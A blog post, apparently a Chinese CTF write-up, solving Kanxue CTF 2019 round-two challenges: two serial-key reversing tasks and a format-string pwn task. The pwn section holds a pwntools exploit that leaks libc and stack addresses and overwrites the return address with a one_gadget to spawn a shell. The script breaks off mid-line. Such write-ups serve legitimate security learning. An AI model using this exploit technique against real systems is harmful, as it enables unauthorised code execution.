<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        看雪CTF晋级赛二部分Writeup - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> 你若盛开，清风自来！ </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            <i>萝卜</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#看雪CTF晋级赛二"><span class="toc-text">看雪CTF晋级赛二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘来信"><span class="toc-text">神秘来信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#消失的岛屿"><span class="toc-text">消失的岛屿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#金字塔的诅咒"><span class="toc-text">金字塔的诅咒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#达芬奇密码"><span class="toc-text">达芬奇密码</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        看雪CTF晋级赛二部分Writeup
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2019-06-11 21:52:42</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>第二场<br><a id="more"></a></p>
<h2 id="看雪CTF晋级赛二"><a href="#看雪CTF晋级赛二" class="headerlink" title="看雪CTF晋级赛二"></a>看雪CTF晋级赛二</h2><h3 id="神秘来信"><a href="#神秘来信" class="headerlink" title="神秘来信"></a>神秘来信</h3><p>算是个签到题吧，程序是32位，无壳</p>
<p>main<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// [esp+10h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// [esp+11h] [ebp-3Bh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// [esp+12h] [ebp-3Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+13h] [ebp-39h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+14h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+15h] [ebp-37h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  sub_401410(<span class="string">"请输入序列号:\n"</span>);</span><br><span class="line">  sub_4013D0(<span class="string">"%s"</span>, &amp;v9);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">7</span> &amp;&amp; v14 == <span class="number">51</span> &amp;&amp; v13 == <span class="number">53</span> &amp;&amp; v12 == <span class="number">51</span> &amp;&amp; v11 + v10 + v9 == <span class="number">149</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v3 = *(&amp;v9 + v6++) + <span class="number">16</span> * v3 - <span class="number">48</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v6 &lt; v4 );</span><br><span class="line">    &#125;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">    sub_401410(<span class="string">"error!\n"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401410(<span class="string">"error\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先限制了长度位6，后三位是<code>353</code>，前三位之和是149</p>
<p>然后在ida中看有一部分看不出来是啥意思，emm，动态调试，当输入<code>122353</code>时，前面的限制是可以过去的，但是到<code>.text:0040134E                 call    loc_401354</code>时，就会直接走下去，走到输出<code>error！</code></p>
<p>当调用<code>loc_401354</code>时，f7进去，首先会给eax附一个值<code>401353</code>（并不知道它是怎么给他赋上去的），然后用刚刚我们输入转到寄存器中存储,形似<code>123456 -&gt;  eax: 00123456</code>，用我们输入的6位数减去eax的值，然后<code>div esi</code>，若不发生异常的话，就会走到<code>error</code>，那么我们就让他产生异常，我们输入<code>401353</code>，到<code>div esi</code>的时候，esi等于0，我们知道除数不能为0，那么程序就会产生异常，然后调到输出<code>success</code>的地方</p>
<p>综上所述，序列号就是<code>401353</code></p>
<h3 id="消失的岛屿"><a href="#消失的岛屿" class="headerlink" title="消失的岛屿"></a>消失的岛屿</h3><p>32位，无壳</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Str; <span class="comment">// [esp+11h] [ebp-3Fh]</span></span><br><span class="line">  <span class="keyword">char</span> *Str1; <span class="comment">// [esp+48h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> *Str2; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter Serial:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">" %s"</span>, &amp;Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;Str) &gt; <span class="number">0x31</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">  Str2 = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x400</span>u);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;Str);</span><br><span class="line">  base64_encode(&amp;Str, Str2, v3);</span><br><span class="line">  Str1 = <span class="string">"!NGV%,$h1f4S3%2P(hkQ94=="</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"!NGV%,$h1f4S3%2P(hkQ94=="</span>, Str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please Try Again"</span>);</span><br><span class="line">  <span class="built_in">free</span>(Str2);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数没的说，函数名提示说是base64，但是最后相比较的字符串不想base64，想到是变种的base64</p>
<p>查找字符串发现<code>tuvwxTUlmnopqrs7YZabcdefghij8yz0123456VWXkABCDEFGHIJKLMNOPQRS9+/</code><br>的确是变种base64，但是最后的字符串仍有不在这个范围内的</p>
<p>进入<code>base64_encode</code>函数<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl base64_encode(int a1,<span class="built_in"> int </span>a2,<span class="built_in"> int </span>a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int8 v15; // [esp+Bh] [ebp-Dh]</span><br><span class="line">  unsigned __int8 v16; // [esp+Bh] [ebp-Dh]</span><br><span class="line"> <span class="built_in"> int </span>v17; // [esp+Ch] [ebp-Ch]</span><br><span class="line"> <span class="built_in"> int </span>v18; // [esp+Ch] [ebp-Ch]</span><br><span class="line"> <span class="built_in"> int </span>v19; // [esp+Ch] [ebp-Ch]</span><br><span class="line"> <span class="built_in"> int </span>v20; // [esp+10h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v20 = 0;</span><br><span class="line">  v17 = 0;</span><br><span class="line">  while ( v20 &lt; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v17;</span><br><span class="line">    v18 = v17 + 1;</span><br><span class="line">    v4 = (_BYTE *)(v3 + a2);</span><br><span class="line">    *v4 = charEncrypt((*(_BYTE *)(v20 + a1) &gt;&gt; 2) &amp; 0x3F);</span><br><span class="line">    v15 = 16 * *(_BYTE *)(v20 + a1) &amp; 0x30;</span><br><span class="line">   <span class="built_in"> if </span>( v20 + 1 &gt;= a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v18;</span><br><span class="line">      v6 = v18 + 1;</span><br><span class="line">      v7 = (_BYTE *)(v5 + a2);</span><br><span class="line">      *v7 = charEncrypt(v15);</span><br><span class="line">      *(_BYTE *)(v6 + a2) = 61;</span><br><span class="line">      v8 = v6 + 1;</span><br><span class="line">      v17 = v6 + 2;</span><br><span class="line">      *(_BYTE *)(v8 + a2) = 61;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = v18;</span><br><span class="line">    v19 = v18 + 1;</span><br><span class="line">    v10 = (_BYTE *)(v9 + a2);</span><br><span class="line">    *v10 = charEncrypt((unsigned __int8)((*(_BYTE *)(v20 + 1 + a1) &gt;&gt; 4) | v15));</span><br><span class="line">    v16 = 4 * *(_BYTE *)(v20 + 1 + a1) &amp; 0x3C;</span><br><span class="line">   <span class="built_in"> if </span>( v20 + 2 &gt;= a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v19 + a2) = charEncrypt(v16);</span><br><span class="line">      v11 = v19 + 1;</span><br><span class="line">      v17 = v19 + 2;</span><br><span class="line">      *(_BYTE *)(v11 + a2) = 61;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v19 + a2) = charEncrypt((unsigned __int8)((*(_BYTE *)(v20 + 2 + a1) &gt;&gt; 6) | v16));</span><br><span class="line">    v12 = v19 + 1;</span><br><span class="line">    v17 = v19 + 2;</span><br><span class="line">    v13 = (_BYTE *)(v12 + a2);</span><br><span class="line">    *v13 = charEncrypt(*(_BYTE *)(v20 + 2 + a1) &amp; 0x3F);</span><br><span class="line">    v20 += 3;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v17 + a2) = 0;</span><br><span class="line"> <span class="built_in"> return </span>v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现base64加密后的每一位都<code>charEncrypt</code>函数转换了</p>
<p>进入<code>charEncrypt</code>函数<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl charEncrypt(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed<span class="built_in"> int </span>v2; // [esp+18h] [ebp+8h]</span><br><span class="line"></span><br><span class="line">  v2 = aTuvwxtulmnopqr[a1];</span><br><span class="line"> <span class="built_in"> if </span>( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 )</span><br><span class="line">   <span class="built_in"> return </span>155 - v2;</span><br><span class="line"> <span class="built_in"> if </span>( v2 &gt; 96 &amp;&amp; v2 &lt;= 122 )</span><br><span class="line">   <span class="built_in"> return </span>v2 - 64;</span><br><span class="line"> <span class="built_in"> if </span>( v2 &gt; 47 &amp;&amp; v2 &lt;= 57 )</span><br><span class="line">   <span class="built_in"> return </span>v2 + 50;</span><br><span class="line"> <span class="built_in"> if </span>( v2 == 43 )</span><br><span class="line">   <span class="built_in"> return </span>119;</span><br><span class="line"> <span class="built_in"> if </span>( v2 == 47 )</span><br><span class="line">    v2 = 121;</span><br><span class="line"> <span class="built_in"> return </span>v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对base64加密后的字符串进行了分类转换</p>
<p>解密脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mybase64decode</span><span class="params">(ciphertext)</span>:</span></span><br><span class="line">	index_table = <span class="string">"tuvwxTUlmnopqrs7YZabcdefghij8yz0123456VWXkABCDEFGHIJKLMNOPQRS9+/"</span></span><br><span class="line">	num=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">		<span class="keyword">if</span> ciphertext[x]==<span class="string">"="</span>:</span><br><span class="line">			num+=<span class="number">1</span></span><br><span class="line">	ciphertext =ciphertext.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line">	arr = []</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">		arr.append(index_table.index(ciphertext[x]))</span><br><span class="line">	binary_str = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">		binary_str+=bin(arr[y])[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">"0"</span>)</span><br><span class="line">	binary_str = binary_str[<span class="number">0</span>:len(binary_str)-(num*(<span class="number">8</span><span class="number">-6</span>))]</span><br><span class="line">	plaintext = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(binary_str),<span class="number">8</span>):</span><br><span class="line">		plaintext+=chr(eval(<span class="string">"0b"</span>+binary_str[x:x+<span class="number">8</span>]))</span><br><span class="line">	<span class="keyword">return</span> plaintext</span><br><span class="line">data = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">"!NGV%,$h1f4S3%2P(hkQ94"</span>:</span><br><span class="line">	<span class="keyword">if</span> ord(x)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(x)&lt;<span class="number">91</span>:</span><br><span class="line">		data +=chr(<span class="number">155</span>-ord(x))</span><br><span class="line">	<span class="keyword">if</span> ord(x)&gt;<span class="number">32</span> <span class="keyword">and</span> ord(x)&lt;=<span class="number">58</span>:</span><br><span class="line">		data += chr(ord(x)+<span class="number">64</span>)</span><br><span class="line">	<span class="keyword">if</span> ord(x)&gt;<span class="number">97</span> <span class="keyword">and</span> ord(x)&lt;=<span class="number">107</span>:</span><br><span class="line">		data += chr(ord(x)<span class="number">-50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(data),data</span><br><span class="line"><span class="keyword">print</span> len(<span class="string">"!NGV%,$h1f4S3%2P(hkQ94"</span>),<span class="string">"!NGV%,$h1f4S3%2P(hkQ94"</span></span><br><span class="line"><span class="keyword">print</span> mybase64decode(<span class="string">"aMTEeld6q4tHserKh69Jyt=="</span>)</span><br></pre></td></tr></table></figure></p>
<p>Serial：KanXue2019ctf_st</p>
<h3 id="金字塔的诅咒"><a href="#金字塔的诅咒" class="headerlink" title="金字塔的诅咒"></a>金字塔的诅咒</h3><p>32位pwn题，保护全开<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜 ➜ CurseofPyramid  checksec --file format       </span><br><span class="line">[*] '/media/wxm/Lenovo/study/ctf/\xe7\x9c\x8b\xe9\x9b\xaaCTF/2019\xe7\xac\xac\xe4\xba\x8c\xe5\x9c\xba/CurseofPyramid/format'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line">一筐萝卜 ➜ CurseofPyramid</span><br></pre></td></tr></table></figure></p>
<p>在mian函数中存在格式化字符串漏洞，但是格式化字符串不在栈上，经过sunny师傅的指点，学会了绕过这个来格式化字符串修改地址的方法，膜师傅</p>
<p>gdb调试，我们可以先通过格式化字符串来泄露出来栈地址和libc基地址<br><img src="https://s2.ax1x.com/2019/06/11/V2SgTf.jpg" alt> </p>
<p>然后通过修改ret地址为<code>one_gadget</code>地址，然后退出，getshell</p>
<p>那么格式化的地址串不在栈上，怎么控制修改呢？</p>
<p>首先需要找到一个在栈上的指针，指向的地址也是栈上的，我们修改这个指针位ret地址，然后再对这个指针进行操作就行了（涨知识了）</p>
<blockquote>
<p>本程序退出是用的是<code>lea     esp, [ecx-4];retn</code>，ret地址并不是<code>rbp+4</code>，之前没有发现，耽误了好长时间</p>
</blockquote>
<p>完整exp：（我写脚本贼菜）<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">r = remote(<span class="string">"152.136.18.34"</span>,<span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="meta"># r = process(<span class="meta-string">"./format"</span>)</span></span><br><span class="line"><span class="meta"># libc = ELF(<span class="meta-string">"./libc.so.6"</span>)</span></span><br><span class="line"><span class="variable">__libc_start_main_symbols_addr</span> =  libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"__libc_start_main_symbols_addr:"</span>+ hex(<span class="variable">__libc_start_main_symbols_addr</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What do tou want to say:"</span>)</span><br><span class="line">r.sendline(<span class="string">"%11$p"</span>)</span><br><span class="line"><span class="variable">__libc_start_main_241_addr</span> = eval(r.recvuntil(<span class="string">"\n"</span>,<span class="built_in">drop</span>=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"__libc_start_main_247_addr:"</span>+ hex(<span class="variable">__libc_start_main_241_addr</span>))</span><br><span class="line"><span class="variable">__libc_start_main_addr</span> = <span class="variable">__libc_start_main_241_addr</span>-<span class="number">247</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"__libc_start_main_addr:"</span>+ hex(<span class="variable">__libc_start_main_addr</span>))</span><br><span class="line">base_addr = <span class="variable">__libc_start_main_addr</span>-<span class="variable">__libc_start_main_symbols_addr</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"base_addr:"</span>+ hex(base_addr))</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+base_addr</span><br><span class="line">binsh_addr = <span class="number">0</span>x0015902b+base_addr</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"system_addr:"</span>+ hex(system_addr))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"binsh_addr:"</span>+ hex(binsh_addr))</span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"---------------leak ret addr ----------"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What do tou want to say:"</span>)</span><br><span class="line">r.sendline(<span class="string">"%8$p"</span>)</span><br><span class="line">stack_addr_1 = eval(r.recvuntil(<span class="string">"\n"</span>,<span class="built_in">drop</span>=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"stack_addr_1:"</span>+ hex(stack_addr_1))</span><br><span class="line">ret_addr = stack_addr_1-<span class="number">4</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"ret_addr:"</span>+ hex(ret_addr))</span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line"></span><br><span class="line">one_gg = <span class="number">0</span>x3a80e + base_addr</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What do tou want to say:"</span>)</span><br><span class="line">pay = <span class="string">"%"</span>+<span class="built_in">str</span>(ret_addr&amp;<span class="number">0</span>xffff)+<span class="string">"c"</span>+<span class="string">"%5$hn"</span></span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What do tou want to say:"</span>)</span><br><span class="line">pay = <span class="string">"%"</span>+<span class="built_in">str</span>(one_gg&amp;<span class="number">0</span>xffff)+<span class="string">"c"</span>+<span class="string">"%53$hn"</span></span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What do tou want to say:"</span>)</span><br><span class="line">pay = <span class="string">"%"</span>+<span class="built_in">str</span>(ret_addr+<span class="number">2</span>&amp;<span class="number">0</span>xffff)+<span class="string">"c"</span>+<span class="string">"%5$hn"</span></span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What do tou want to say:"</span>)</span><br><span class="line">pay = <span class="string">"%"</span>+<span class="built_in">str</span>((one_gg&amp;<span class="number">0</span>xffff0000)&gt;&gt;<span class="number">16</span>)+<span 